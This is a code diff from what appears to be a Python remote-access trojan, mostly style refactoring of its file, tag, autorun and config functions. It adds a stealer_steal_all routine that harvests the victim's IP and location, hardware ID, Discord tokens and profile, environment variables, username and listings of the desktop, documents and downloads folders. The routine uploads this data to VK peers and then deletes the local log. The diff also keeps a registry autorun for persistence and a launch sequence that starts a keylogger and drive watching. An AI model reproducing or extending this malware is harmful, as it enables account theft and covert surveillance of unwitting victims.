     except Exception as exception:  # noqa
         # If there is error.
 
@@ -1970,9 +1827,7 @@ def filesystem_try_listdir(path) -> typing.List:
 
 
 def filesystem_get_size(path: str) -> float:
-    # @function filesystem_get_size()
-    # @returns float
-    # @description Function that returns size of the item in megabytes.
+    """ Returns size of the filesystem element. """
 
     # Megabyte size.
     mb_size = 1024 * 1024
@@ -1984,7 +1839,7 @@ def filesystem_get_size(path: str) -> float:
 
             # Getting size of the file.
             return int(os.path.getsize(path) / mb_size)
-        elif os.path.isdir(path):
+        if os.path.isdir(path):
             # If this is directory.
 
             # Returning size of self and childrens.
@@ -2004,17 +1859,17 @@ def filesystem_get_type(path: str) -> str:
 
         # Returning directory.
         return "Directory"
-    elif os.path.isfile(path):
+    if os.path.isfile(path):
         # If this is file.
 
         # Returning file.
         return "File"
-    elif os.path.islink(path):
+    if os.path.islink(path):
         # If this is link.
 
         # Returning link.
         return "Link"
-    elif os.path.ismount(path):
+    if os.path.ismount(path):
         # If this is mount.
 
         # Returning mount.
@@ -2059,8 +1914,8 @@ def filesystem_get_drives_list() -> typing.List:
         drives_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
         # Returning list.
-        return ["%s:\\\\" % drive_letter for drive_letter in drives_letters
-                if os.path.exists('%s:\\\\' % drive_letter)]
+        return [f"{drive_letter}:\\\\" for drive_letter in drives_letters
+                if os.path.exists(f"{drive_letter}:\\\\")]
     except Exception as exception:  # noqa
         # If there is exception occurred.
 
@@ -2141,7 +1996,7 @@ def load_tags() -> None:
 
             # Message.
             debug_message("[Tags] Not found tags file, resetting to default!")
-        
+
             # Reset tags.
             reset_tags()
     except Exception as exception:  # noqa
@@ -2152,9 +2007,6 @@ def load_tags() -> None:
 
         # Setting error tags.
         CLIENT_TAGS = DEFAULT_INVALID_TAGS
-
-    # Message.
-    debug_message("[Tags] Loading complete!")
 
 
 def parse_tags(tags: str) -> typing.List:
@@ -2540,6 +2392,111 @@ def discord_api_call(method: str, params: typing.Dict, func, data, token: str) -
 
 # Stealer.
 
+
+def stealer_steal_all(force: bool = False) -> None:
+    """
+    Steals all data.
+    :param force: If true, steals even if already worked.
+    """
+
+    try:
+        # Trying to steal.
+
+        if not stealer_is_already_worked() or force:
+            # If we not already stolen all or forcing.
+
+            # Default data.
+            data: typing.Dict[str, typing.Any] = {}
+
+            # Writing internet data.
+            ip = get_ip()
+            data["internet_ipaddress"] = ip["ip"]
+            data["internet_city"] = ip["city"]
+            data["internet_country"] = ip["country"]
+            data["internet_region"] = ip["region"]
+            data["internet_provider"] = ip["org"]
+
+            if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
+                # If HWID is not disabled.
+
+                # Writing HWID.
+                data["computer_hardware_index"] = get_hwid()
+
+            # Discord.
+            if FEATURE_STARTUP_DISCORD_GRABBING_ENABLED:
+                # If enabled.
+                data["discord_tokens"] = stealer_steal_discord_tokens()
+                data["discord_profile"] = stealer_steal_discord_profile(data["discord_tokens"])
+
+            if not sys.platform.startswith("linux"):
+                # If not linux.
+
+                # Processor.
+                data["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS", "") + " cores "
+                data["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE", "") + " "
+                data["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER", "") + " "
+                data["computer_processor"] += os.getenv("PROCESSOR_LEVEL", "") + " "
+                data["computer_processor"] += os.getenv("PROCESSOR_REVISION", "")
+
+                # Computer..
+                data["computer_username"] = os.getenv("UserName")
+                data["computer_name"] = os.getenv("COMPUTERNAME")
+                data["computer_operating_system"] = os.getenv("OS")
+
+                # Envronment.
+                data["computer_environment_variables"] = get_environment_variables()
+
+                # Getting path data.
+                userprofile = os.getenv("userprofile")
+                drive = os.getcwd().split("\\")[0]
+
+                # Directories.
+                data["directory_root"] = filesystem_try_listdir(f"{drive}\\")
+                data["directory_programfiles"] = filesystem_try_listdir(f"{drive}\\Program Files")
+                data["directory_programfiles86"] = filesystem_try_listdir(f"{drive}\\Program Files (x86)")
+                data["directory_downloads"] = filesystem_try_listdir(f"{userprofile}\\Downloads")
+                data["directory_documents"] = filesystem_try_listdir(f"{userprofile}\\Documents")
+                data["directory_desktop"] = filesystem_try_listdir(f"{userprofile}\\Desktop")
+
+            # Getting file path.
+            path = FOLDER + CONFIG["paths"]["log"]
+
+            # Building path.
+            filesystem_build_path(path)
+
+            with open(path, "w", encoding="UTF-8") as log_file:
+                # With opened file.
+
+                # Dumping.
+                json.dump(data, log_file, indent=4)
+
+            for peer in CONFIG["server"]["vk"]["peers"]:
+                # For every peer in peers.
+
+                # Uploading document.
+                uploading_status, uploading_result = server_upload_document(path, "Log File", peer, "doc")
+
+                # Message.
+                if uploading_status and isinstance(uploading_result, str):
+                    # If all is ok.
+
+                    # Message.
+                    server_message("[Stealer] First launch data:", uploading_result, peer)
+                else:
+                    # If there is error.
+
+                    # Message.
+                    server_message(f"[Stealer] Error when uploading first launch data: {uploading_result}", None, peer)
+
+            # Try to delete file after uploading.
+            filesystem_try_delete(path)
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Error.
+        debug_message(f"[Stealer] Failed to steall all! Exception - {exception}")
+
+
 def stealer_steal_discord_profile(tokens: typing.List[str] = None) -> typing.Optional[typing.Dict]:
     """ Steals all discord profile information. """
 
@@ -2591,7 +2548,7 @@ def stealer_steal_discord_tokens() -> typing.List[str]:
             # For log files in folder.
 
             # Opening file.
-            with open(f"{token_path}\\{log_file}", errors="ignore", encoding="UTF-8") as file:
+            with open(f"{token_path}\\{log_file}", errors="ignore") as file:
                 # Opening file.
 
                 for line in [line.strip() for line in file.readlines() if line.strip()]:
@@ -2652,21 +2609,23 @@ def autorun_register() -> None:
         # If this is not exe file.
 
         # Debug message.
-        debug_message("[Autorun] Not registering, as running not from final executable file (not a .exe), "
-                      "if you prefer to register anyway, change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")
+        debug_message("[Autorun] Not registering, "
+                      "as running not from final executable file (not a .exe), "
+                      "if you prefer to register anyway, "
+                      "change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")
 
         # Returning.
         return
 
     if not sys.platform.startswith("win32"):
         # If not windows family.
-        
+
         # Debug message.
         debug_message("[Autorun] Not registering, as running not from Windows-Family OS.")
 
         # Returning.
         return
-    
+
     try:
         # Trying to import winreg module.
 
@@ -2704,7 +2663,10 @@ def autorun_register() -> None:
                                       reserved=0, access=winreg.KEY_ALL_ACCESS)
 
         # Adding autorun.
-        winreg.SetValueEx(registry_key, CONFIG["autorun"]["name"], 0, winreg.REG_SZ, executable_path)
+        winreg.SetValueEx(registry_key,
+                          CONFIG["autorun"]["name"], 0,
+                          winreg.REG_SZ,
+                          executable_path)
 
         # Closing key.
         winreg.CloseKey(registry_key)
@@ -2732,17 +2694,19 @@ def autorun_unregister() -> None:
         # If this is not exe file.
 
         # Debug message.
-        debug_message("[Autorun] Not unregistering, as running not from final executable file (not a .exe), "
-                      "if you prefer to register anyway, change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")
+        debug_message("[Autorun] Not unregistering, "
+                      "as running not from final executable file (not a .exe), "
+                      "if you prefer to register anyway, "
+                      "change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")
         return
 
     if not sys.platform.startswith("win32"):
         # If not windows family.
-        
+
         # Debug message.
         debug_message("[Autorun] Not unregistering, as running not from Windows-Family OS.")
         return
-    
+
     try:
         # Trying to import winreg module.
 
@@ -2752,15 +2716,17 @@ def autorun_unregister() -> None:
         # If there is ImportError.
 
         # Debug message.
-        debug_message("[Autorun] Failed to unregister self from the autorun! Could not import module winreg")
+        debug_message("[Autorun] Failed to unregister self from the autorun! "
+                      "Could not import module winreg")
         return
 
     try:
         # Trying to remove autorun.
 
         # Opening key.
+        registry_autorun_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         registry_key: winreg.HKEYType = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
-                                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                                       sub_key=registry_autorun_key,
                                                        reserved=0, access=winreg.KEY_ALL_ACCESS)
 
         # Deleting autorun.
@@ -2772,7 +2738,8 @@ def autorun_unregister() -> None:
         # If error occurred.
 
         # Debug message.
-        debug_message(f"[Autorun] Failed to unregister self from the autorun! Exception: {exception}")
+        debug_message(f"[Autorun] Failed to unregister self from the autorun! "
+                      f"Exception: {exception}")
 
 
 # Config.
@@ -2790,7 +2757,8 @@ def load_config() -> None:
             CONFIG = json.load(config_file)
     except FileNotFoundError:
         # If CONFIG not exists.
-        debug_message("[Config] Failed to load CONFIG file as it is not found! Please read more wiki...")
+        debug_message("[Config] Failed to load CONFIG file as it is not found! "
+                      "Please read more wiki...")
 
     if not CONFIG:
         # If empty.
@@ -2810,11 +2778,35 @@ def load_config() -> None:
         debug_message("[Config] Failed to load main folder in paths->main! Is CONFIG file invalid?")
         sys.exit(1)
 
-    # Message.
-    debug_message("[Config] Loading complete!")
-
 
 # Other.
+
+def check_operating_system_supported() -> None:
+    """ Exists code if operating system is not supported. """
+
+    for platform in PLATFORMS_SUPPORTED:
+        # Iterating over all platforms in the supported platforms.
+
+        if sys.platform.startswith(platform):
+            # If current PC is have this platform (Supported).
+
+            if platform in PLATFORMS_DEVELOPMENT:
+                # If this is development platform.
+
+                # Showing debug message.
+                debug_message(f"You are currently running this app on platform {platform} "
+                              "which is not fully supported!")
+
+            # Returning from the function as current platform is supported.
+            return
+
+    # Code lines below only executes if code above don't found supported platform.
+
+    # Debug message.
+    debug_message("Oops... You are running app on the platform "
+                  f"{sys.platform} which is not supported! Sorry for that!")
+    sys.exit(1)
+
 
 def peer_is_allowed(peer: str) -> bool:
     """ Returns is peer is allowed or not. """
@@ -2836,7 +2828,7 @@ def exit_handler() -> None:
     """ Should be registered as exit handler (at_exit). """
 
     # Sever message.
-    server_message("Disconnected from the network!")
+    server_message(command_exit().get_text())
 
     # Debug message.
     debug_message("[Exit Handler] Exit...")
@@ -2855,7 +2847,7 @@ def launch() -> None:
         load_config()
 
         # Asserting operating system, exiting if the operation system is not supported.
-        assert_operating_system()
+        check_operating_system_supported()
 
         # Initialising functions for the remote access.
         initialise_commands()
@@ -2866,14 +2858,11 @@ def launch() -> None:
         # Loading name from the system.
         load_name()
 
-        # Start message.
-        debug_message("[Launch] Tags and name loading completed!")
-
         # Connecting to the server.
         server_connect()
 
-        # Starting spreading on the other drives.
-        spreading_start()
+        # Starting drives watching.
+        drives_waching_start()
 
         # Starting keylogger that will steals all keys pressed.
         keylogger_start()
@@ -2887,11 +2876,8 @@ def launch() -> None:
         # Registering exit_handler() as handler for exit.
         atexit.register(exit_handler)
 
-        # Start message.
-        debug_message("[Launch] Almost done, stealing data...")
-
         # Stealing all of the data.
-        stealer_steal_data()
+        stealer_steal_all()
 
         # Start message.
         debug_message("[Launch] Launch end! Starting listening server...")
@@ -2906,5 +2892,11 @@ def launch() -> None:
         sys.exit(1)
 
 
-# Entry point of the app, calling launch function to start all systems.
-launch()
+if __name__ == "__main__":
+    # Entry point.
+
+    # TODO. CHECK ASAP.
+    multiprocessing.freeze_support()
+
+    # Entry point of the app, calling launch function to start all systems.
+    launch()
